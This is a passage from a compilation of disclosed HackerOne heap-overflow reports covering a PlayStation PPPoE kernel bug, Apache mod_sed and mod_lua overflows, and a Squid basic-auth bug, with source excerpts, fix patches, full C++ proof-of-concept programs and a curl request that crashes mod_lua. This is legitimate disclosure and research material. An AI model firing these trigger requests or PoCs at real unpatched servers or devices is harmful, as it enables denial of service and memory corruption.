If the state machine is not delayed and works as intended then the resolution is made locally, which in my opinion a privacy violation because a local DNS query could possibly deanonymize a user who specifically requests socks5h. In my solution patch I do not allow it.

If the state machine is delayed then the resolution is made remotely with a malformed SOCKS packet. The attacker has written to the heap and likely overwritten in-use data that come after `data->state.buffer`. It's undefined behavior at best and *possible* RCE at worst.

I think if libcurl was built with IDN support then the worst case is much harder to achieve because only certain bytes can be in the hostname.

---

### [Remote kernel heap overflow](https://hackerone.com/reports/1350653)

- **Report ID:** `1350653`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** PlayStation
- **Reporter:** @m00nbsd
- **Bounty:** - usd
- **Disclosed:** 2022-05-11T18:09:35.428Z
- **CVE(s):** CVE-2022-29867

**Summary (team):**

# Summary

The PlayStation has a kernel PPPoE driver, that originates from NetBSD. This driver has a kernel heap overflow vulnerability, that an attacker can remotely trigger over the LAN, with the ability to control both the contents that are overflown and their sizes.

# Technical Details

## PPPoE Protocol

In short, the PlayStation (PS) will:

 1. Send a PADI packet.
 2. Expect to receive a PADO packet.
 3. Send a PADR packet.
 4. Expect to receive a PADS packet.

## The Vulnerability

I determined that the PS' PPPoE driver originates from NetBSD. In that PPPoE driver, there is a vulnerability in the way PADR packets are allocated:

```c
static int
pppoe_send_padr(struct pppoe_softc *sc)
{
	[...]

	/* Compute packet length. */
	len = sizeof(struct pppoetag);
	if (sc->sc_service_name != NULL) {
		l1 = strlen(sc->sc_service_name);
		len += l1;
	}
	if (sc->sc_ac_cookie_len > 0) {
		len += sizeof(struct pppoetag) + sc->sc_ac_cookie_len;
	}
	if (sc->sc_relay_sid_len > 0) {
		len += sizeof(struct pppoetag) + sc->sc_relay_sid_len;
	}
	len += sizeof(struct pppoetag) + sizeof(sc->sc_id);
	if (sc->sc_sppp.pp_if.if_mtu > PPPOE_MAXMTU) {
		len += sizeof(struct pppoetag) + 2;
	}

	/* Allocate packet. */
	m0 = pppoe_get_mbuf(len + PPPOE_HEADERLEN);
	if (m0 == NULL)
		return ENOBUFS;

	/* Fill in packet. */
	[...]
}

static struct mbuf *
pppoe_get_mbuf(size_t len)
{
	struct mbuf *m;

	MGETHDR(m, M_DONTWAIT, MT_DATA);
	if (m == NULL)
		return NULL;
	if (len + sizeof(struct ether_header) > MHLEN) {
		MCLGET(m, M_DONTWAIT);
		if ((m->m_flags & M_EXT) == 0) {
			m_free(m);
			return NULL;
		}
	}
	m->m_data += sizeof(struct ether_header);
	m->m_len = len;
	m->m_pkthdr.len = len;
	m_reset_rcvif(m);

	return m;
}
```

The flow is:

 - `pppoe_send_padr()`:
   - It wants to send a PADR packet.
   - It computes the packet length, and calls `pppoe_get_mbuf()`.
 - `pppoe_get_mbuf()`:
   - If the length is larger than `MHLEN`, it allocates an mbuf cluster, of size `MCLBYTES`=2048.
   - It returns that mbuf cluster.
 - `pppoe_send_padr()`:
   - It fills in the mbuf cluster.

The vulnerability here is that the packet length could actually be bigger than `MCLBYTES`, in which case the filling of the packet will overflow the mbuf cluster.

## Constraints

To have a length that is larger than `MCLBYTES`, the `sc_ac_cookie_len` and `sc_relay_sid_len` values need to be large enough.

Both of these values are actually extracted from PADO packets that the PS previously received: they are the lengths of the `ACCOOKIE` and `RELAYSID` tags that were embedded in the PADO packets. The attacker can control these lengths.

There is a constraint on the MTU: given that the PS' maximum MTU is 1500, the attacker cannot directly send just one PADO packet with sizes larger than `MCLBYTES`. To work around that constraint, the attacker just has to send two PADO packets, one with a big `ACCOOKIE` tag, and another with a big `RELAYSID` tag. After the second packet, the PS will send a PADR packet combining both big tags, which will overflow the mbuf cluster with the contents of the second tag.

## Attack Scenario

 1. The PS sends a PADI.
 2. The attacker sends a PADO, with a `ACCOOKIE` tag whose size is 1400 bytes.
 3. The PS sends a PADR. This one is fine, there is no overflow here.
 4. The PS waits for a PADS packet.
 5. The PS times out, and resends a PADI.
 6. The attacker sends a PADO, with a `RELAYSID` tag whose size is 1400 bytes.
 7. The PS Sends a PADR. The overflow occurs here: the PS tries to embed the two tags (1400x2=2800 bytes) into a 2048-byte mbuf cluster.

## Setup / PoC / Discussion

 - Enable PPPoE on the PS:
   - `Settings` -> `Network` -> `Set Up Internet Connection` -> `Use a LAN Cable` -> `Custom`
   - IP Address Settings: `PPPoE`
   - Enter whatever in the two User/Password fields, click `Next`
   - DNS Settings: `Automatic`
   - MTU Settings: set `1500`
   - Proxy Server: `Do Not Use`
 - Connect a Linux laptop to the PS with an Ethernet cable.
 - On the Linux laptop:
   - `cc -o poc poc.c -Wall`
   - `sudo ifconfig eth0 mtu 8000`
   - `sudo ./poc eth0`
 - On the PS: click `Test Internet Connection`. This will initiate the PPPoE connection.

To see what happens:

 - Open WireShark on the Linux laptop, and look at the packets that are being exchanged with the PS. You can see that the PS sends 2844-byte PADR packets.
 - Actual exploitation/introspection will require a debugger, which I do not have. :'(
 - ███████

## Impact

Possible RCE. I did my tests only on a friend's PS4, but I suspect that the PS5 is affected as well.

---

### [Read and write beyond bounds in mod_sed](https://hackerone.com/reports/1511619)

- **Report ID:** `1511619`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @tdp3kel9g
- **Bounty:** - usd
- **Disclosed:** 2022-04-14T18:07:07.420Z
- **CVE(s):** CVE-2022-23943

**Vulnerability Information:**

This CVE consists of several bugs in mod_sed, where overflows, truncation, uses after free and a logic error can allow a remote, unauthenticated attacker to read and/or write heap locations beyond bounds. See https://github.com/apache/httpd/commit/943f57b336f264d77e5b780c82ab73daf3d14deb and https://github.com/apache/httpd/commit/e266bd09c313a668d7cca17a8b096d189148be49 for the commits that fixed the bugs. Attached are my reports to the httpd team; email me if you need additional information.

----
1. Use-after-free and truncation/overflows causing read/write beyond bounds:
```
Greetings. I have discovered a use-after-free bug in sed1.c that causes a read and/or write beyond bounds.

The bug is that dosub() (modules/filters/sed1.c) does not update |step_vars->loc1| or |step_vars->loc2| after appending to -- and thus possibly causing an expansion and reallocation of -- |genbuf| and/or |linebuf|. If a reallocation of |linebuf| occurs, this omission leaves |step_vars->loc1| and |step_vars->loc2| pointing into the old |linebuf|, causing failures later.

When control exits dosub(), then enters again on the next iteration of the loop in substitute() [1], a read and/or write beyond bounds occurs in the first call from dosub() to place(), because place()'s |al1| argument points to the new |linebuf|, while the |al2| argument points to the old |linebuf|. This causes place() to calculate a bogus |n|:

   int n = al2 - al1;

[2] and then to read and/or write beyond bounds via:

   memcpy(sp, al1, n);

The invalid access is only an incorrectly-shortened read or a read beyond bounds if |n| does not become negative and if

   unsigned int reqsize = (sp - eval->genbuf) + n + 1;

does not overflow, because in this case the resulting |genbuf| is large enough to accomodate |n| bytes of data. If, however, |n| is negative or |reqsize| overflows, |reqsize| is too small, and place() doesn't enlarge |genbuf| to accomodate the true |n|, causing the memcpy() to write beyond bounds.

Below is a POC that demonstrates the issue.

Use the POC thusly:

   1. Build httpd_bug_17h.cpp (below) using Visual Studio, modifying the server IP address (127.0.0.1 in the provided code) to be instead the IP address or DNS name of the test httpd server installation.

   2. Copy postform.htm (below) to /bug17h/postform.htm in the httpd server's ServerRoot folder.

   3. Add the httpd.conf lines (see below) into the httpd server installation's httpd.conf in a <Location> section for the ServerRoot folder.

   4. Restart httpd.

   5. Attach a debugger to httpd and set a breakpoint on grow_line_buffer ().

   6. Run httpd_bug_17h, which will send the triggering POST data to httpd.

   7. When the breakpoint fires, check |newsize|. If it is < ~33MB let control continue. When |newsize| reaches 16MB, continuing will cause execution to resume for ~15 minutes (on a relatively-old CPU).

   8. When |newsize| reaches ~33MB, examine and record the values of |eval->linebuf| and |eval->lspend|. Now step over the call to grow_buffer() and notice that it reallocates the line buffer, giving new values for |eval->linebuf| and |eval->lspend|.

   9. Step out of grow_line_buffer(), etc., back into dosub(). Step the last few lines of dosub() and notice how it leaves |step_vars|'s |loc*| members pointing to the old |linebuf|.

   10. Now set a BP on dosub()'s first call to place() and proceed.

   11. When the BP fires, step into place(). Notice that |al2| points into the old |linebuf|, whereas |al1| points into the new |linebuf|. Step through the calculation of |n| and notice how it's bogus (in my tests, it's negative). Notice how |reqsize| also becomes bogus. Step the rest of the function and notice how the memcpy() reads beyond bounds.

Note that the POC uses an expansion factor of 256 (i.e., one "0" becomes 256 "z" characters. I suspect that more realistic expansion factors will trigger the same bug. I am working on a POC to show that.)

This bug is still present in trunk. https://svn.apache.org/viewvc/httpd/httpd/trunk/modules/filters/

-------- NOTES ---------
[1] Of course, substitute()'s call to match() is also bogus, because it uses the un-updated |step_vars|, and thus reads from the old |linebuf|!

[2] The use of |int| here is also bogus and can cause truncation and subsequent invalid operation. I will submit another bug involving this and other bad uses of |int| or |unsigned int| in this module, such as in the buffer-size doubling operation in grow_buffer(), which can overflow and cause the allocation of an undersized buffer, followed by a write beyond bounds. BTW, I found this bug while pursuing a POC for that bug.

-------- httpd_bug_17h.cpp ----------------------------------------------------
#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma warning (disable:6262)
constexpr char SERVER_NAME[] = "127.0.0.1";

int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {
    int iResult;
    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);
    if (*pSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        return SOCKET_ERROR;
    }

    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));
    return iResult;
}

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET serverSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

// Initialize Winsock

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
//    hints.ai_flags = AI_PASSIVE;

// Resolve the server's address and port

    iResult = getaddrinfo(SERVER_NAME, "80", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

// POST 16MB of data to 127.0.0.1/bug17h/postform.htm to cause the overflow and subsequent WBB.

    iResult = ConnectSocket(result, &serverSocket);

    if (iResult == SOCKET_ERROR) {
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    char req1[] =
        "POST /bug17h/postform.htm HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: text/html\r\n"
        "Content-Type:  application/x-www-form-urlencoded\r\n"
        "Content-Length: 16777219\r\n"
        "Connection: close\r\n\r\n";

    const size_t sz = 16777219 + sizeof(req1) + 2; // for ending \n and 0
    char* pReq1 = new char[sz];
    memcpy(pReq1, req1, strlen(req1));
    memset(&pReq1[strlen(req1)], '0', sz - strlen(req1));
    memcpy(&pReq1[strlen(req1)], "t1=", 3);
    pReq1[sz - 2] = '\n';
    pReq1[sz - 1] = 0;

    iResult = send(serverSocket, pReq1, sz, 0);
    if (iResult == SOCKET_ERROR) {
        closesocket(serverSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

// Receive and throw away the response.

    char recvBuf[65536];

    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);
    closesocket(serverSocket);

// The bug has been triggered. Cleanup and exit.

    closesocket(serverSocket);
    freeaddrinfo(result);
    WSACleanup();

    return 0;
}

-------- httpd_bug_17h.cpp ----------------------------------------------------


-------- postform.htm --------------------------------------------------------
<!DOCTYPE html>

<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
    <title></title>
</head>
<body>

</body>
</html>
-------- postform.htm ---------------------------------------------------------


-------- httpd.conf lines -----------------------------------------------------
<Location /bug17h>
    AddInputFilter Sed htm
    InputSed "s/0/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/g"
</Location>
-------- httpd.conf lines -----------------------------------------------------
```
----
2. Update to 1, above, using an expansion ratio that is more likely to be commonly used by web-accessible servers. Also observes a denial-of-service attack (but this can be mitigated by administrator's use of length constraints):
```
Greetings. I have verified that the bug described in the previous report zhbug17h can be reproduced using a more reasonable expansion factor.

In the original POC, I used expansion factor 256, via:

    <Location /bug17h>
        AddInputFilter Sed htm
        InputSed "s/0/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/g"
    </Location>

I have now verified that the same bug occurs with the practical expansion factor 6, via:

    <Location /bug17h>
        AddInputFilter Sed htm
        InputSed "s/0/zzzzzz/g"
    </Location>

This expansion factor is similar to what might be expected in an attack on an InputSed filter that escapes HTML entities, thus expanding, say, |"| to |&quot;| .

███

█████████
```
----
3. Overflow and write beyond bounds:
```
Greetings. This submission is a follow-on to submission zhbug17h.

grow_buffer() (modules/filters/sed1.c) can experience a write beyond bounds caused by an overflow bug. The attacker can control the exact content and amount of data written. Unlike bug zhbug17h, no particular expansion factor is needed, since the bug occurs before sed1.c's substitution code runs.

The bug is that |int spendsize| becomes negative if an attacker sends > 0x80000000 payload bytes of data to a page being processed via an InputSed "s//" rule. This occurs because the sed1.c's line buffer (|linebuf|) gets enlarged in steps to 0x80000000 bytes. When it next needs to be enlarged to hold the remaining bytes beyond 0x80000000, grow_buffer() calculates:

112:   spendsize = *spend - *buffer;

At this point, |*spend - *buffer| is 0x80000000, but |spendsize| is an |int|, so it becomes negative.

This then causes grow_buffer() to calculate a |spend| 0x80000000 bytes before the newly-allocated buffer's beginning via:

120:   *spend = *buffer + spendsize;

This updates |eval->linebuf| and |eval->lspend| via grow_line_buffer()'s call to grow_buffer():

129:   grow_buffer(eval->pool, &eval->linebuf, &eval->lspend,
130:               &eval->lsize, newsize);

When control returns to appendmem_to_linebuf(), the line

165:   memcpy(eval->lspend, sz, len);

writes attacker-provided data to an incorrect area in the heap, 0x80000000 bytes before the beginning of |eval->linebuf|. The amount of data written is controllable by the attacker, because it is exactly the amount of payload data transferred to httpd minus 0x80000000.

Attached is a POC that demonstrates the bug.

Use the POC (httpd_bug_17i.cpp, below) in the same way as the POC for bug zhbug17h, except, at step 7 et seq, do this:

   7. When the breakpoint fires, check |newsize|. When it reaches > 0x80000000 (should be 0x80001055), step into grow_buffer().

   8. Step to line 112. Manually evaluate |*spend - *buffer| and notice that it's 0x80000000.

   9. Step through line 112. Notice that |spendsize| becomes 0x80000000 (which is -2147483648).

   10. Step through line 120. Notice that |*spend| is 0x80000000 bytes *less than* |*buffer|.

   11. Step out into grow_line_buffer(). Notice how |eval->lspend| is 0x80000000 bytes less than |eval->linebuf|.

   12. Step out into appendmem_to_linebuf(). Step line 165 and notice how it copies 0x1055 bytes of the string "Attack code and data!" into the incorrect heap locations.

   13. Set a BP on appendmem_to_linebuf() and proceed. When the BP fires, step through the memcpy() and notice how it copies an additional 0xfab bytes of simulated attack code and data into the incorrect heap locations. (total attack data copied = 0x2000 bytes)

Note also that sed1.c contains several uses of |int|, probably all of which are unsafe in 64-bit builds because of potential overflows/truncations.

-------- httpd_bug_17i.cpp ----------------------------------------------------
#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma warning (disable:6262)
constexpr char SERVER_NAME[] = "127.0.0.1";

int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {
    int iResult;
    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);
    if (*pSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        return SOCKET_ERROR;
    }

    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));
    return iResult;
}

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET serverSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

// Initialize Winsock

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
//    hints.ai_flags = AI_PASSIVE;

// Resolve the server's address and port

    iResult = getaddrinfo(SERVER_NAME, "80", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

// POST 16MB of data to 127.0.0.1/bug17h/postform.htm to cause the overflow and subsequent WBB.

    iResult = ConnectSocket(result, &serverSocket);

    if (iResult == SOCKET_ERROR) {
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

#if 0 // was original bug_17h

    char req1[] =
        "POST /bug17h/postform.htm HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: text/html\r\n"
        "Content-Type:  application/x-www-form-urlencoded\r\n"
        "Content-Length: 16777219\r\n"
        "Connection: close\r\n\r\n";

    const size_t sz = 16777219 + sizeof(req1) + 2; // for ending \n and 0

#endif
    char req1[] =
        "POST /bug17h/postform.htm HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: text/html\r\n"
        "Content-Type:  application/x-www-form-urlencoded\r\n"
        "Content-Length: 2147491840\r\n"
        "Connection: close\r\n\r\n";

    const size_t sz = 0x80002000 + sizeof(req1) + 2; // for ending \n and 0
    char* pReq1 = new char[sz];
    memcpy(pReq1, req1, strlen(req1));
    memset(&pReq1[strlen(req1)], '0', sz - strlen(req1));
    memcpy(&pReq1[strlen(req1)], "t1=", 3);
    pReq1[sz - 2] = '\n';
    pReq1[sz - 1] = 0;
    const size_t backoffset = 0x2000+3;
    char* pBad = pReq1 + sz - backoffset;
    const char acd[] = "Attack code and data!";

    while (pBad <= pReq1 + sz - sizeof(acd)) {
        strcpy(pBad, "Attack code and data!");
        pBad += sizeof(acd);
    }

    WSABUF w;
    w.buf = pReq1; w.len = sz;
    DWORD bytesSent = 0;

    iResult = WSASend(serverSocket, &w, 1, &bytesSent, 0, NULL, NULL);
    if (iResult == SOCKET_ERROR) {
        closesocket(serverSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

// Receive and throw away the response.

    char recvBuf[65536];

    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);
    closesocket(serverSocket);

// The bug has been triggered. Cleanup and exit.

    closesocket(serverSocket);
    freeaddrinfo(result);
    WSACleanup();

    return 0;
}

-------- httpd_bug_17i.cpp ----------------------------------------------------
```
----
4. Logic error and miscellaneous overflows probably leading to writes beyond bounds (logic-error section begins "Good! But I see some curious code...."):
```
On 2/9/22 11:15 PM, ███████ wrote:
> See notes below. Thanks for sticking with me on this rather-extended bug-smashing journey.
>
> ███
>
> On 2/9/2022 12:23 AM, █████████ wrote:
>>
>> On 2/8/22 11:07 PM, ███████ wrote:
>>> Hi. There are still some |int| bugs here, for example
>>>
>>>      1031 static apr_status_t wline(sed_eval_t *eval, char *buf, int sz)
>>>
>>> still takes an |int| size, which probably can be made to overflow via
>>>
>>>      580          rv = wline(eval, eval->linebuf, eval->lspend - eval->linebuf);
>>>
>>> or one of the other several calls to wline().
>> Fixed. Thanks. I found some further ones. Please find attached the size_t patch and the combined patch
>
> Good! But I see some curious code in sed_write_output(). Line 175, beginning "if ((status == APR_SUCCESS)...", is odd. What
> happens if |status != APR_SUCCESS|? The |else| clause on lines 183-86 that does a memcpy() of size |sz| runs. But |sz| might be
> (much) larger than the buffer allocated by the call to alloc_outbuf() on line 172, because that call allocates only |ctx->bufsize|
> bytes. So this looks like a potential write-beyond-bounds bug.
>
> 161:     remainbytes = ctx->bufsize - (ctx->curoutbuf - ctx->outbuf);
> 162:     if (sz >= remainbytes) {
> 163:         if (remainbytes > 0) {
> 164:             memcpy(ctx->curoutbuf, buf, remainbytes);
> 165:             buf += remainbytes;
> 166:             sz -= remainbytes;
> 167:             ctx->curoutbuf += remainbytes;
> 168:         }
> 169:         /* buffer is now full */
> 170:         status = append_bucket(ctx, ctx->outbuf, ctx->bufsize);
> 171:         /* old buffer is now used so allocate new buffer */
> 172:         alloc_outbuf(ctx);
> 173:         /* if size is bigger than the allocated buffer directly add to output
> 174:          * brigade */
> 175:         if ((status == APR_SUCCESS) && (sz >= ctx->bufsize)) {
> 176:             char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);
> 177:             status = append_bucket(ctx, newbuf, sz);
> 178:             /* pool might get clear after append_bucket */
> 179:             if (ctx->outbuf == NULL) {
> 180:                 alloc_outbuf(ctx);
> 181:             }
> 182:         }
> 183:         else {
> 184:             memcpy(ctx->curoutbuf, buf, sz);
> 185:             ctx->curoutbuf += sz;
> 186:         }
> 187:     }
> 188:     else {
> 189:         memcpy(ctx->curoutbuf, buf, sz);
> 190:         ctx->curoutbuf += sz;
> 191:     }
> 192:     return status;
> 193: }

Another good catch. How about:

Index: modules/filters/mod_sed.c
===================================================================
--- modules/filters/mod_sed.c	(revision 1897897)
+++ modules/filters/mod_sed.c	(working copy)
@@ -168,21 +168,29 @@ static apr_status_t sed_write_output(void *dummy,
         }
         /* buffer is now full */
         status = append_bucket(ctx, ctx->outbuf, ctx->bufsize);
-        /* old buffer is now used so allocate new buffer */
-        alloc_outbuf(ctx);
-        /* if size is bigger than the allocated buffer directly add to output
-         * brigade */
-        if ((status == APR_SUCCESS) && (sz >= ctx->bufsize)) {
-            char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);
-            status = append_bucket(ctx, newbuf, sz);
-            /* pool might get clear after append_bucket */
-            if (ctx->outbuf == NULL) {
+        if (status == APR_SUCCESS) {
+            /* if size is bigger than the allocated buffer directly add to output
+             * brigade */
+            if (sz >= ctx->bufsize) {
+                char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);
+                status = append_bucket(ctx, newbuf, sz);
+                if (status == APR_SUCCESS) {
+                    /* old buffer is now used so allocate new buffer */
+                    alloc_outbuf(ctx);
+                }
+                else {
+                    clear_ctxpool(ctx);
+                }
+            }
+            else {
+                /* old buffer is now used so allocate new buffer */
                 alloc_outbuf(ctx);
+                memcpy(ctx->curoutbuf, buf, sz);
+                ctx->curoutbuf += sz;
             }
         }
         else {
-            memcpy(ctx->curoutbuf, buf, sz);
-            ctx->curoutbuf += sz;
+            clear_ctxpool(ctx);
         }
     }
     else {
...
```

## Impact

Possible exfiltration of private data from a web server and/or its users; injection of data and/or code into web server, possibly resulting in changes of control flow.

**Summary (team):**

important: mod_sed: Read/write beyond bounds (CVE-2022-23943)

Out-of-bounds Write vulnerability in mod_sed of Apache HTTP Server allows an attacker to overwrite heap memory with possibly attacker provided data.

This issue affects Apache HTTP Server 2.4 version 2.4.52 and prior versions.

Acknowledgements: Ronald Crane (Zippenhop LLC)

Reported to security team:	2022-01-13
Update 2.4.53 released:	2022-03-14
Affects:	<=2.4.52

https://httpd.apache.org/security/vulnerabilities_24.html

---

### [Buffer overflow in req_parsebody method in lua_request.c](https://hackerone.com/reports/1434056)

- **Report ID:** `1434056`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @chamal
- **Bounty:** - usd
- **Disclosed:** 2022-01-04T15:31:01.108Z
- **CVE(s):** CVE-2021-44790

**Vulnerability Information:**

Software Versions
-------------------
Ubuntu - 18.04 (32-bit)
Apache 2.4.51 (32-bit)

Description
-------------
This bug is present in "req_parsebody" method of modules/lua/lua_request.c file.
Below mentioned lines of code cause this bug.

```cpp
  ...
  size_t  vlen = 0;
  ...
  ...
  vlen = end - crlf - 8;
  buffer = (char *) apr_pcalloc(r->pool, vlen+1);
  memcpy(buffer, crlf + 4, vlen);
  ...
```

Above code does not check whether the result of (end - crlf) is greater than or equal to 8.
So it is possible to make the result of (end - crlf - 8), negative.
Sending this HTTP request causes the result to be -1.
   `curl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\r\n\r\naaa-' http://127.0.0.1/test.lua`

Since "vlen" is of type "size_t", -1 will become 4294967295. This is the maximum value of size_t data type in 32 bit systems.
Then vlen+1 is passed to apr_pcalloc method.
So the actual size allocated is 0.
Since the allocated buffer is too small there will be an overflow and crash in next memcpy statement.

Steps to Reproduce
--------------------
1.  Build Apache web server with Lua module
   ./configure --enable-lua=shared
   make
   make install 

2.  Enable Lua module with Apache web server.
    Add these lines to httpd.conf file.
 ```
   LoadModule lua_module modules/mod_lua.so
   <Files "*.lua">
    SetHandler lua-script
   </Files>
 ```
3. Copy attached F1555487 file to htdocs folder.

4. Start Apache web server in debug single worker mode.
   `./httpd -X -d /home/apache/install-directory/`

5. Send this HTTP request with CURL.
    `curl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\r\n\r\naaa-' http://127.0.0.1/test.lua`
    Apache web server will crash.

Valgrind Output
----------------
Command: valgrind ./httpd -X -d /home/apache/install-directory/

 Invalid write of size 1
 at 0x483513B: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
 by 0x501355B: req_parsebody (lua_request.c:415)
 by 0x503628E: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5041A1F: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x50365E5: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5030D96: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5035C1A: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5036886: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5032556: lua_pcallk (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x500D02B: lua_handler (mod_lua.c:323)
 by 0x15F9E4: ap_run_handler (config.c:169)
 by 0x16040C: ap_invoke_handler (config.c:443)
 Address 0x12aec000 is not stack'd, malloc'd or (recently) free'd

 Process terminating with default action of signal 11 (SIGSEGV)
 Access not within mapped region at address 0x12AEC000
 at 0x483513B: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
 by 0x501355B: req_parsebody (lua_request.c:415)
 by 0x503628E: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5041A1F: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x50365E5: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5030D96: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x5035C1A: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x5036886: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x5032556: lua_pcallk (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x500D02B: lua_handler (mod_lua.c:323)
by 0x15F9E4: ap_run_handler (config.c:169)
 by 0x16040C: ap_invoke_handler (config.c:443)

## Impact

May be possible to use in a denial of service attack.

**Summary (team):**

A carefully crafted request body can cause a buffer overflow in the mod_lua multipart parser (r:parsebody() called from Lua scripts).

The Apache httpd team is not aware of an exploit for the vulnerability though it might be possible to craft one.

This issue affects Apache HTTP Server 2.4.51 and earlier.

Acknowledgements: Chamal

Reported to security team: 2021-12-07
Fixed by r1896039 in 2.4.x: 2021-12-16
Update 2.4.52 released: 2021-12-20
Affects: <=2.4.51

https://httpd.apache.org/security/vulnerabilities_24.html

---

### [Basic Authentication Heap Overflow](https://hackerone.com/reports/641240)

- **Report ID:** `641240`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @jeriko_one
- **Bounty:** - usd
- **Disclosed:** 2021-08-26T23:39:11.118Z
- **CVE(s):** CVE-2019-12527

**Vulnerability Information:**

## Summary:
An attacker can get arbitrary data overflowed in the heap via Basic Authorization base64 blob. Even when basic auth isn't configured.

## Report sent to developers

When calling HttpHeader::getAuth the field value will be base64 decoded. The call to the decode method doesn't ensure that the buffer decodedAuthToken is large enough for the decoded string leading to a heap overflow. 

```
static char decodedAuthToken[8192]; 
struct base64_decode_ctx ctx; base64_decode_init(&ctx); 
size_t decodedLen = 0;
